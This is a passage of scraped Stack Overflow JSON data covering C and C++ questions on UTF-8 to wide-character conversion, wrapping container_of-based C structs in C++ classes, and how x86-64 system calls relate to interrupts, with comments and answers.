(console) should be 176 but is instead 194.</p>\n\n<p>If you use \"!\" the correct value of 33 will be displayed.\nI made sure that char is unsigned by setting the GCC compiler flag</p>\n\n<pre><code>-unsigned-char\n</code></pre>\n\n<p>The GCC compiler uses UTF-8 encoding as the default. I really don't know where the issue is right now.</p>\n\n<p>Do I need to add another flag to the compiler?</p>\n\n<p><strong>Update</strong></p>\n\n<p>With the help of @Kninnug answer, I managed to write a code that will produce the desired results for me.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;locale.h&gt;\n#include &lt;string.h&gt;\n#include &lt;wchar.h&gt;\n#include &lt;stdint.h&gt;\n\nint main(void)\n{\n   size_t n = 0, x = 0;\n   setlocale(LC_CTYPE, \"en_US.utf8\");\n   mbstate_t state = {0};\n   char in[] = \"!\u00b0\u6c34\"; // or u8\"z\u00df\u6c34\"\n   size_t in_sz = sizeof(in) / sizeof (*in);\n\n   printf(\"Processing %zu UTF-8 code units: [ \", in_sz);\n   for(n = 0; n &lt; in_sz; ++n)\n   {\n      printf(\"%#x \", (unsigned char)in[n]);\n   }\n   puts(\"]\");\n\n   wchar_t out[in_sz];\n   char* p_in = in, *end = in + in_sz;\n   wchar_t *p_out = out;\n   int rc = 0;\n   while((rc = mbrtowc(p_out, p_in, end - p_in, &amp;state)) &gt; 0)\n   {\n       p_in += rc;\n       p_out += 1;\n   }\n\n   size_t out_sz = p_out - out + 1;\n   printf(\"into %zu wchar_t units: [ \", out_sz);\n   for(x = 0; x &lt; out_sz; ++x)\n   {\n      printf(\"%u \", (unsigned short)out[x]);\n   }\n   puts(\"]\");\n}\n</code></pre>\n\n<p>However, when I run this on my embedded device, the non-ASCII characters get merged into one wchar, not into two like on my computer.</p>\n\n<p>I could use single-byte encoding with cp1252 (this worked fine) but I would like to keep using unicode.</p>\n"}, {"tags": ["c++", "c"], "comments": [{"owner": {"reputation": 61304, "user_id": 4117728, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/66831ed13ffd9c497541220ec45c15c3?s=128&d=identicon&r=PG&f=1", "display_name": "largest_prime_is_463035818", "link": "https://stackoverflow.com/users/4117728/largest-prime-is-463035818"}, "edited": false, "score": 2, "creation_date": 1524669714, "post_id": 50025919, "comment_id": 87068044, "body": "do i understand correctly that you already have two working solutions and you want some input on which one would be better? In that case your question may be better at <a href=\"https://codereview.stackexchange.com\">codereview.stackexchange.com</a>, while here you may get &quot;too broad&quot; or otherwise motivated down/close votes"}, {"owner": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 2, "creation_date": 1524669728, "post_id": 50025919, "comment_id": 87068052, "body": "You should use <a href=\"http://en.cppreference.com/w/cpp/memory/unique_ptr\" rel=\"nofollow noreferrer\"><code>std::unique_ptr</code></a> for owning pointers."}, {"owner": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 0, "creation_date": 1524669820, "post_id": 50025919, "comment_id": 87068119, "body": "Callbacks can be easily stored in a <a href=\"http://en.cppreference.com/w/cpp/utility/functional/function\" rel=\"nofollow noreferrer\"><code>std::function</code></a> and combine well with <a href=\"http://en.cppreference.com/w/cpp/language/lambda\" rel=\"nofollow noreferrer\">lambda expressions</a> to capture any relevant variable or object."}, {"owner": {"reputation": 175, "user_id": 2348789, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c6bffc0ccf9ea99edb8e1099c864a1f2?s=128&d=identicon&r=PG", "display_name": "backscattered", "link": "https://stackoverflow.com/users/2348789/backscattered"}, "edited": false, "score": 0, "creation_date": 1524670019, "post_id": 50025919, "comment_id": 87068256, "body": "Although codereview is possibly a better area for this, my main question is there a better way to accomplish this. I&#39;m cool if this is closed though, and I&#39;ll move it to codereview."}, {"owner": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 0, "creation_date": 1524670336, "post_id": 50025919, "comment_id": 87068498, "body": "@backscattered It&#39;s not clear to me what you are trying to do. In the <code>c</code> version, I don&#39;t see where <code>b</code> comes into play."}, {"owner": {"reputation": 175, "user_id": 2348789, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c6bffc0ccf9ea99edb8e1099c864a1f2?s=128&d=identicon&r=PG", "display_name": "backscattered", "link": "https://stackoverflow.com/users/2348789/backscattered"}, "reply_to_user": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 0, "creation_date": 1524671182, "post_id": 50025919, "comment_id": 87069050, "body": "@Fran&#231;oisAndrieux I added some example operations for b. This is fairly standard method signatures in C libraries where the main struct that is central to a function is supplied as pointer within the first argument."}, {"owner": {"reputation": 175, "user_id": 2348789, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c6bffc0ccf9ea99edb8e1099c864a1f2?s=128&d=identicon&r=PG", "display_name": "backscattered", "link": "https://stackoverflow.com/users/2348789/backscattered"}, "reply_to_user": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 0, "creation_date": 1524671263, "post_id": 50025919, "comment_id": 87069102, "body": "@Fran&#231;oisAndrieux I can&#39;t see the use of a unique_ptr for the _Obj members as they may be deleted by subclasses. Am I missing something here?"}, {"owner": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 0, "creation_date": 1524671578, "post_id": 50025919, "comment_id": 87069306, "body": "@backscattered Right, now that I look more closely, <code>std::unique_ptr</code> is not applicable. Though I think that&#39;s because the ownership of <code>A_Obj</code> is illdefined. If you make a <code>B</code>, that instance&#39;s <code>~A</code> will try to delete <code>A_Obj</code> which I can&#39;t tell if it&#39;s deletable or not. And it&#39;s still not clear to me what <code>b</code> does in the first example. I&#39;m not very familiar with <code>c</code>, so maybe is should be obvious, but perhaps a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> would be in order. Are you sure <a href=\"http://en.cppreference.com/w/cpp/utility/functional/function\" rel=\"nofollow noreferrer\"><code>std::function</code></a> isn&#39;t what you are looking for?"}, {"owner": {"reputation": 175, "user_id": 2348789, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c6bffc0ccf9ea99edb8e1099c864a1f2?s=128&d=identicon&r=PG", "display_name": "backscattered", "link": "https://stackoverflow.com/users/2348789/backscattered"}, "reply_to_user": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 0, "creation_date": 1524674669, "post_id": 50025919, "comment_id": 87071005, "body": "@Fran&#231;oisAndrieux I updated the question to provide a full usage example. I hope this helps. You can compile it by concatenating all the code blocks together into a file."}, {"owner": {"reputation": 175, "user_id": 2348789, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c6bffc0ccf9ea99edb8e1099c864a1f2?s=128&d=identicon&r=PG", "display_name": "backscattered", "link": "https://stackoverflow.com/users/2348789/backscattered"}, "reply_to_user": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 0, "creation_date": 1524675145, "post_id": 50025919, "comment_id": 87071228, "body": "@Fran&#231;oisAndrieux the ownership of A is indeed ill-defined as it&#39;s a hack to attempt to mimic a contained struct."}, {"owner": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 0, "creation_date": 1524676761, "post_id": 50025919, "comment_id": 87072071, "body": "@backscattered Is the problem that, in the case of a <code>B</code> you do not want <code>A</code> to have it&#39;s own <code>a</code> but rather to use <code>B::b</code>&#39;s <code>a</code> instead?"}, {"owner": {"reputation": 175, "user_id": 2348789, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c6bffc0ccf9ea99edb8e1099c864a1f2?s=128&d=identicon&r=PG", "display_name": "backscattered", "link": "https://stackoverflow.com/users/2348789/backscattered"}, "reply_to_user": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "edited": false, "score": 0, "creation_date": 1524676935, "post_id": 50025919, "comment_id": 87072160, "body": "@Fran&#231;oisAndrieux Yes. That&#39;s definitely the problem with this implementation. Perhaps there&#39;s a better way of doing this."}], "owner": {"reputation": 175, "user_id": 2348789, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c6bffc0ccf9ea99edb8e1099c864a1f2?s=128&d=identicon&r=PG", "display_name": "backscattered", "link": "https://stackoverflow.com/users/2348789/backscattered"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 102, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1524674083, "creation_date": 1524669577, "last_edit_date": 1524674083, "question_id": 50025919, "link": "https://stackoverflow.com/questions/50025919/wrapping-struct-hierarchy-into-c-classes", "title": "wrapping struct hierarchy into C++ classes", "body": "<p>How can this hierarchy be wrapped by C++ classes that contain member functions which call their C equivalents?</p>\n\n<p>C often uses a significant number of hacks to obtain an inheritance hierarchy. One of which, is the <code>container_of</code> macro that is used heavily within the linux kernel. I'm working with an existing C library written in such a style, and I would like to adapt the struct hierarchy into one wrapped by C++. For purposes of illustration, I'll use the following struct hierarchy.</p>\n\n<pre><code>#include &lt;cstdio&gt;\n#include &lt;iostream&gt;\n#include &lt;cstddef&gt;\n\n#define container_of(ptr, type, member) ({                      \\\n        const typeof( ((type *)0)-&gt;member ) *__mptr = (ptr);    \\\n        (type *)( (char *)__mptr - offsetof(type,member) );})\n\nextern \"C\" {\n    struct a;\n\n    typedef void (*callback_t)(struct a *self);\n\n    struct a {\n        callback_t cb;\n    };\n\n    struct b {\n        struct a a;\n        const char * name;\n    };\n\n    void handle_event(struct a *self) {\n        self-&gt;cb(self);\n    };\n\n    void process_event(struct a * a) {\n        handle_event(a);\n    }\n\n    void some_a_operation(struct a * self) {\n        printf(\"some operation called on a @ %p\\n\", self);\n    }\n\n    void some_b_operation(struct b * self) {\n        printf(\"some operation called on a @ %p\\n\", self);\n    }\n\n    void c_callback_handler(struct a * a)\n    {\n        struct b * b = container_of(a, struct b, a);\n        printf(\"%s\\n\", b-&gt;name);\n    }\n};\n</code></pre>\n\n<p>Given no changes to the above code, I can see the following means.</p>\n\n<h1>Delegation with wrappers</h1>\n\n<p>This overcomes the prior examples issues of <code>struct a</code> duplication at the cost of significant complexity.</p>\n\n<pre><code>class A {\npublic:\n    A() {\n        A_Wrap = new A_wrapper {{A::Cb}, this};\n        A_Obj = &amp;A_Wrap-&gt;a_member;\n    }\n    virtual ~A() {\n        delete A_Wrap;\n    }\n    void OperationA() {\n        some_a_operation(A_Obj);\n    }\n    virtual void InstanceCb() {};\n    // member functions access struct a via A_Obj\nprotected:\n    struct A_wrapper {\n        a a_member;\n        A * A_member;\n    };\n    A_wrapper* A_Wrap;\n    a * A_Obj;\nprivate:\n    static void Cb(a * self) {\n        A_wrapper * a_wrapper = container_of(self, A_wrapper, a_member);\n        a_wrapper-&gt;A_member-&gt;InstanceCb();\n    }\n};\n\nclass B: public A {\npublic:\n    B() {\n        delete A_Wrap;\n        B_Wrap = new B_wrapper {{&amp;B::Cb}, this};\n        A_Obj = &amp;B_Wrap-&gt;b_member.a;\n        B_Obj = &amp;B_Wrap-&gt;b_member;\n    }\n    virtual ~B() {\n        A_Wrap = nullptr;\n        delete B_Wrap;\n    }\n    void OperationB() {\n        some_b_operation(B_Obj);\n    }\n    virtual void InstanceCb() {\n        std::cout &lt;&lt; \"B class\" &lt;&lt; std::endl;\n    };\n    // member functions access struct a via A_Obj\nprotected:\n    struct B_wrapper {\n        b b_member;\n        B * B_member;\n    };\n    B_wrapper * B_Wrap;\n    b * B_Obj;\nprivate:\n    static void Cb(a * self) {\n        b * b_contained = container_of(self, b, a);\n        B_wrapper * b_wrapper = container_of(b_contained, B_wrapper, b_member);\n        b_wrapper-&gt;B_member-&gt;InstanceCb();\n    }\n};\n</code></pre>\n\n<h1>Usage Examples</h1>\n\n<pre><code>int main(int argc, char **argv) {\n    // C usage\n    const char * b_name = \"b struct\";\n    struct b b_cexample = {\n            {c_callback_handler}, b_name\n    };\n\n    process_event(&amp;b_cexample.a);\n    some_a_operation(&amp;b_cexample.a);\n    some_b_operation(&amp;b_cexample);\n\n\n    // C++ usage example\n    B b_cppexample;\n    b_cppexample.InstanceCb();\n    b_cppexample.OperationA();\n    b_cppexample.OperationB();\n}\n</code></pre>\n"}, {"tags": ["c", "linux", "assembly", "operating-system", "x86-64"], "comments": [{"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 1, "creation_date": 1524669714, "post_id": 50025864, "comment_id": 87068045, "body": "Well, the exact syscall mechanism is OS and architecture dependent, but you are not wholly on the wrong track:)"}, {"owner": {"reputation": 52454, "user_id": 547981, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90042f6f33a9f87769fac02096ceea68?s=128&d=identicon&r=PG", "display_name": "Jester", "link": "https://stackoverflow.com/users/547981/jester"}, "edited": false, "score": 0, "creation_date": 1524669776, "post_id": 50025864, "comment_id": 87068085, "body": "<code>write</code> is a C function call. It&#39;s not directly compiled to a <code>syscall</code>. That is inside the function itself. <code>syscall 0x80</code> is not valid you are mixing that up with <code>int 0x80</code> which is the old 32 bit way to invoke the kernel. That is an interrupt. <code>syscall</code> does not use interrupt mechanism."}, {"owner": {"reputation": 84872, "user_id": 2545680, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/DCo33.jpg?s=128&g=1", "display_name": "Max Koretskyi", "link": "https://stackoverflow.com/users/2545680/max-koretskyi"}, "reply_to_user": {"reputation": 52454, "user_id": 547981, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90042f6f33a9f87769fac02096ceea68?s=128&d=identicon&r=PG", "display_name": "Jester", "link": "https://stackoverflow.com/users/547981/jester"}, "edited": false, "score": 0, "creation_date": 1524670501, "post_id": 50025864, "comment_id": 87068597, "body": "@Jester, yeah, thanks, I got that confused. I updated the code. But I&#39;m more interested in broad picture now, not particularities of assembly (if that makes sense). And yes, I meant that the function <code>write</code> is implemented with <code>syscall</code> in assembly. I guess that&#39;s what you&#39;re saying"}, {"owner": {"reputation": 27437, "user_id": 95954, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/iD0qO.png?s=128&g=1", "display_name": "Rudy Velthuis", "link": "https://stackoverflow.com/users/95954/rudy-velthuis"}, "edited": false, "score": 0, "creation_date": 1524781624, "post_id": 50025864, "comment_id": 87121832, "body": "@AngularInDepth.com: ISTM that you are <b>asking</b> about some &quot;particularities of assembly&quot;."}], "answers": [{"tags": [], "owner": {"reputation": 73, "user_id": 9309653, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/58e2b2a41d15701155a449df29379d95?s=128&d=identicon&r=PG&f=1", "display_name": "dualscyther", "link": "https://stackoverflow.com/users/9309653/dualscyther"}, "is_accepted": false, "score": 2, "last_activity_date": 1524676225, "creation_date": 1524676225, "answer_id": 50027832, "question_id": 50025864, "link": "https://stackoverflow.com/questions/50025864/relationship-between-system-calls-api-syscall-instruction-and-exception-mechani/50027832#50027832", "title": "Relationship between system calls API, syscall instruction and exception mechanism (interrupts)", "body": "<p>Not a direct answer to the question but this might interest you (I don't have enough karma to comment) - it explains all the user space execution (including glibc and how it does syscalls) in detail:</p>\n\n<p><a href=\"http://www.maizure.org/projects/printf/index.html\" rel=\"nofollow noreferrer\">http://www.maizure.org/projects/printf/index.html</a></p>\n\n<p>You'll probably be interested in particular in 'Step 8 - Final string written to standard output':</p>\n\n<blockquote>\n  <p>And what does __libc_write look like...?</p>\n\n<pre><code>000000000040f9c0 &lt;__libc_write&gt;:\n  40f9c0:  83 3d c5 bb 2a 00 00   cmpl   $0x0,0x2abbc5(%rip)  # 6bb58c &lt;__libc_multiple_threads&gt;\n  40f9c7:  75 14                  jne    40f9dd &lt;__write_nocancel+0x14&gt;\n\n000000000040f9c9 &lt;__write_nocancel&gt;:\n  40f9c9: b8 01 00 00 00          mov    $0x1,%eax\n  40f9ce: 0f 05                   syscall \n  ...cut...\n</code></pre>\n  \n  <p>Write simply checks the threading state and, assuming all is well,\n  moves the write syscall number (1) in to EAX and enters the kernel.</p>\n  \n  <p>Some notes:</p>\n  \n  <ul>\n  <li>x86-64 Linux write syscall is 1, old x86 was 4</li>\n  <li>rdi refers to stdout</li>\n  <li>rsi points to the string</li>\n  <li>rdx is the string size count</li>\n  </ul>\n</blockquote>\n\n<p>Note that this was for the author's x86-64 Linux system.</p>\n\n<p>For x86, this provides some help:</p>\n\n<p><a href=\"http://www.tldp.org/LDP/khg/HyperNews/get/syscall/syscall86.html\" rel=\"nofollow noreferrer\">http://www.tldp.org/LDP/khg/HyperNews/get/syscall/syscall86.html</a></p>\n\n<blockquote>\n  <p>Under Linux the execution of a system call is invoked by a maskable interrupt or exception class transfer, caused by the instruction int 0x80. We use vector 0x80 to transfer control to the kernel. This interrupt vector is initialized during system startup, along with other important vectors like the system clock vector.</p>\n</blockquote>\n\n<p>But as a general answer for a Linux kernel:</p>\n\n<blockquote>\n  <p>Is my understanding correct that C language system calls are implemented by compiler as syscall's with respective code in assembly, which in turn, are implemented by OS as exceptions mechanism (interrupts)?</p>\n</blockquote>\n\n<p>Yes</p>\n"}, {"comments": [{"owner": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "edited": false, "score": 0, "creation_date": 1524676653, "post_id": 50027906, "comment_id": 87072021, "body": "If you look at LC-3 it is called a TRAP there.  In ARM the instruction used to be called SWI but is now SVC, same machine code and function, both mnemonics are supported at least by gnu assembler and I would assume others.  The implementation is not exact across architectures but the overall functionality is.  There are some architectures that there are specific instructions that do things an instruction to write to the uart vs it being mapped into an address space, way back when that kinda made sense, today you see this on cpus that are not going to run an OS necessarily."}, {"owner": {"reputation": 84872, "user_id": 2545680, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/DCo33.jpg?s=128&g=1", "display_name": "Max Koretskyi", "link": "https://stackoverflow.com/users/2545680/max-koretskyi"}, "edited": false, "score": 0, "creation_date": 1524684002, "post_id": 50027906, "comment_id": 87075820, "body": "Thanks for your elaborate answer.  May I suggest you start the answer with <i>Bottom line is yes you appear to understand this...</i>   and put the details after that?"}, {"owner": {"reputation": 84872, "user_id": 2545680, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/DCo33.jpg?s=128&g=1", "display_name": "Max Koretskyi", "link": "https://stackoverflow.com/users/2545680/max-koretskyi"}, "edited": false, "score": 0, "creation_date": 1524684250, "post_id": 50027906, "comment_id": 87075937, "body": "<i>One would expect that system call to be written in assembly language</i> - and stored as object file so the linker can later pick it up, correct?"}, {"owner": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "reply_to_user": {"reputation": 84872, "user_id": 2545680, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/DCo33.jpg?s=128&g=1", "display_name": "Max Koretskyi", "link": "https://stackoverflow.com/users/2545680/max-koretskyi"}, "edited": false, "score": 0, "creation_date": 1524699915, "post_id": 50027906, "comment_id": 87081732, "body": "You would expect that but sadly for various reasons it is not uncommon for folks to use inline assembly instead of real assembly."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1524710994, "post_id": 50027906, "comment_id": 87084301, "body": "<i>Intel</i> didn&#39;t define software interrupts as the only system-call mechanism, that was Linux&#39;s choice.  They could have picked call-gates with a <code>call far</code> to a specific descriptor, because Intel went nuts with features for privilege levels in 386 (See <a href=\"//stackoverflow.com/q/46022184\">OsDev syscall/sysret and sysenter/sysexit instructions enabling</a> for details on the options).  Fun fact: on 386  the fastest way to enter the kernel was an illegal-instruction trap, and some OSes used that as their system-call mechanism."}, {"owner": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "edited": false, "score": 0, "creation_date": 1524743439, "post_id": 50027906, "comment_id": 87100345, "body": "(nice fun facts)I didnt mean to imply that quite that way.  I meant to imply long before linux, long before windows, and in a way we still see today their path into &quot;system&quot; calls was a &quot;software interrupt&quot;.  But as you are pointing out, wasnt intel but we could say IBM which greatly helped the future of the 8086, chose to use those software interrupts for system calls rather than choosing another solution.  (Microsoft, ditto, etc) Then as each new operating system was created or ported, into each current and new member of the family, opportunity to change was there, along with new choices"}], "tags": [], "owner": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "is_accepted": false, "score": 3, "last_activity_date": 1524744194, "last_edit_date": 1524744194, "creation_date": 1524676447, "answer_id": 50027906, "question_id": 50025864, "link": "https://stackoverflow.com/questions/50025864/relationship-between-system-calls-api-syscall-instruction-and-exception-mechani/50027906#50027906", "title": "Relationship between system calls API, syscall instruction and exception mechanism (interrupts)", "body": "<p>EDIT</p>\n\n<p>Yes, the C application calls a C library function which buried in the C library solution is a system specific call or set of calls, which use an architecturally specific way to reach the operating system, which has an exception/interrupt handler setup to deal with these system calls.  Actually doesnt have to be architecturally specific, can simply jump/call to a well known address, but with modern desire for security and protection modes, a simple call wont have those added features, still functionally correct though.</p>\n\n<p>How the library is implemented is implementation defined.  And how the compiler connects your code to that library runtime or link time has a number of combinations as to how that can happen, there is no one way it can or needs to happen, so it is implementation defined as well.  So long as it is functionally correct and doesnt interfere with the C standards then it can work.</p>\n\n<p>With operating systems like windows and linux and others on our phones and tables there is a strong desire to isolate the applications from the system so they cannot do damage in various ways, so protection is desired, and you need to have an architecturally specific way to make a function call into the operating system that is not a normal call as it switches modes.  If the architecture has more than one way to do this then the operating system can choose one or more of the ways as part of their design.</p>\n\n<p>A \"software interrupt\" is one common way as with hardware interrupts most solutions include a table of handler addresses, by extending that table and having some of the vectors be tied to a software created \"interrupt\" (hitting a special instruction rather than a signal changing state on an input) but go through the same stop, save some state, call the vector, etc.</p>\n"}, {"tags": [], "owner": {"reputation": 33092, "user_id": 5801661, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/D8ENZ.jpg?s=128&g=1", "display_name": "Margaret Bloom", "link": "https://stackoverflow.com/users/5801661/margaret-bloom"}, "is_accepted": true, "score": 5, "last_activity_date": 1524712345, "last_edit_date": 1592644375, "creation_date": 1524686269, "answer_id": 50030393, "question_id": 50025864, "link": "https://stackoverflow.com/questions/50025864/relationship-between-system-calls-api-syscall-instruction-and-exception-mechani/50030393#50030393", "title": "Relationship between system calls API, syscall instruction and exception mechanism (interrupts)", "body": "<h1>TL;DR</h1>\n<p>The <code>syscall</code> instruction itself acts like a glorified jump, it's a hardware-supported way to efficiently and safely jump from unprivileged user-space into the kernel.<br />\nThe <code>syscall</code> instruction jumps to a kernel entry-point that dispatches the call.</p>\n<p>Before x86_64 two other mechanisms were used: the <code>int</code> instruction and the <code>sysenter</code> instruction.<br />\nThey have different entry-points (still present today in 32-bit kernels, and 64-bit kernels that can run 32-bit user-space programs).<br />\nThe former uses the x86 interrupt machinery and can be confused with the exceptions dispatching (that also uses the interrupt machinery).<br />\nHowever, exceptions are spurious events while <code>int</code> is used to generate a software interrupt, again, a glorified jump.</p>\n<hr />\n<p>The C language doesn't concern itself with system calls, it relies on <a href=\"https://stackoverflow.com/questions/2766233/what-is-the-c-runtime-library\">the C runtime</a> to perform all the interactions with the environment of the future program.</p>\n<p>The C runtime implements the above-mentioned interactions through an environment specific mechanism.<br />\nThere could be various layers of software abstractions but in the end the OS APIs get called.</p>\n<p>The term <a href=\"https://en.wikipedia.org/wiki/Application_programming_interface\" rel=\"noreferrer\">API</a> is used to denote a contract, strictly speaking using an API doesn't require to invoke a piece of kernel code (the trend is to implement non-critical functions in userspace to limit the exploitable code), here we are only interested in the subset of the API that requires a privilege switch.</p>\n<p>Under Linux, the kernel exposes a set of services accessible from userspace, these entry-points are called <a href=\"https://en.wikipedia.org/wiki/System_call\" rel=\"noreferrer\">system calls</a>.<br />\nUnder Windows, the kernel services (that are accessed with the same mechanism of the Linux analogues) are considered private in the sense that they are not required to be stable across versions.<br />\nA set of DLL/EXE exported functions are used as entry-points instead (e.g. ntoskrnl.exe, hal.dll, kernel32.dll, user32.dll) that in turn use the kernel services through a (private) system call.<br />\nNote that under Linux, most system calls have a POSIX wrapper around it, so it's possible to use these wrappers, that are ordinary C functions, to invoke a system call.<br />\nThe underlying ABI is different, so is for the error reporting; the wrapper translates between the two worlds.</p>\n<p>The C runtime calls the OS APIs, in the case of Linux the system calls are used directly because they are public (in the sense that are stable across versions), while for Windows the usual DLLs, like kernel32.dll, are marked as dependencies and used.</p>\n<p>We are reduced to the point where an user-mode program, being it part of the C runtime (Linux) or part of an API DLL (Windows), need to invoke a code in the kernel.</p>\n<p>The x86 architecture historically offered different ways to do so, for example, a <a href=\"https://en.wikipedia.org/wiki/Call_gate_(Intel)\" rel=\"noreferrer\">call gate</a>.<br />\nAnother way is through the <a href=\"http://www.felixcloutier.com/x86/INTn:INTO:INT3.html\" rel=\"noreferrer\">int</a> instruction, it has a few advantages:</p>\n<ul>\n<li>It is what the BIOS and the DOS did in their times.<br />\nIn real-mode, using an <code>int</code> instructions is suitable because a vector number (e.g. <code>21h</code>) is easier to remember than a far address (e.g. <code>0f000h:0fff0h</code>).</li>\n<li>It saves the flags.</li>\n<li>It is easy to set up (setting up ISR is relatively easy).</li>\n</ul>\n<p>With the modernization of the architecture this mechanism turned out to have a big disadvantage: it is slow.\nBefore the introduction of the <code>sysenter</code> (note, <code>sysenter</code> not <code>syscall</code>) instruction there was no faster alternative (a call gate would be equally slow).</p>\n<p>With the advent of the Pentium Pro/II<a href=\"http://www.os2museum.com/wp/sysenter-where-are-you/\" rel=\"noreferrer\">[1]</a> a new pair of instructions <code>sysenter</code> and <code>sysexit</code> were introduced to make system calls faster.<br />\nLinux started using them <a href=\"http://articles.manugarg.com/systemcallinlinux2_6.html\" rel=\"noreferrer\">since the version 2.5</a> and are still used today on 32-bit systems I believe.<br />\nI won't explain the whole mechanism of the <code>sysenter</code> instruction and the companion <a href=\"https://en.wikipedia.org/wiki/VDSO\" rel=\"noreferrer\">VDSO</a> necessary to use it, it is only needed to say that it was faster than the <code>int</code> mechanism (I can't find an article from Andy Glew where he says that <code>sysenter</code> turned out to be slow on Pentium III, I don't know how it performs nowadays).</p>\n<p>With the advent of x86-64 the AMD response to <code>sysenter</code>, i.e. the <code>syscall</code>/<code>sysret</code> pair, began the de-facto way to switch from user-mode to kernel-mode.<br />\nThis is due to the fact that <code>sysenter</code> is actually fast and very simple (it copies  <code>rip</code> and <code>rflags</code> into <code>rcx</code> and <code>r11</code> respectively, masks <code>rflags</code> and jump to an address set in <code>IA32_LSTAR</code>).</p>\n<p>64-bit versions of both Linux and Windows use 